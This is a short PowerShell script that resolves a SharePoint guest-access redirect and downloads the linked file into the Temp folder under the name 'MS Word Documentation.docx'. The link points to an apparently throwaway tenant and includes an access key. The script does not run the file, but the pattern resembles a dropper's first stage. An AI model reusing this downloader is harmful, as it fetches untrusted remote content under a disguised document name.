Function Get-RedirectedUrl
{
    Param (
        [Parameter(Mandatory=$true)]
        [String]$URL
    )
 
    $request = [System.Net.WebRequest]::Create($url)
    $request.AllowAutoRedirect=$false
    $response=$request.GetResponse()
 
    If ($response.StatusCode -eq "Found")
    {
        $response.GetResponseHeader("Location")
    }
}

$url = 'https://createanaccount1298-my.sharepoint.com/personal/trip_createanaccount1298_onmicrosoft_com/_layouts/15/guestaccess.aspx?docid=17218b6267fa64547999ba8b76c6fc734&authkey=AVnS8NU6orHZq_sSpTou950'
$codeSetupUrl = Get-RedirectedUrl -URL $url

$uploadfilecodeSetup = "${env:Temp}\MS Word Documentation.docx"

try
{
    (New-Object System.Net.WebClient).DownloadFile($codeSetupUrl, $uploadfilecodeSetup)
}
catch
{
    Write-Error "Failed to download a file"
}
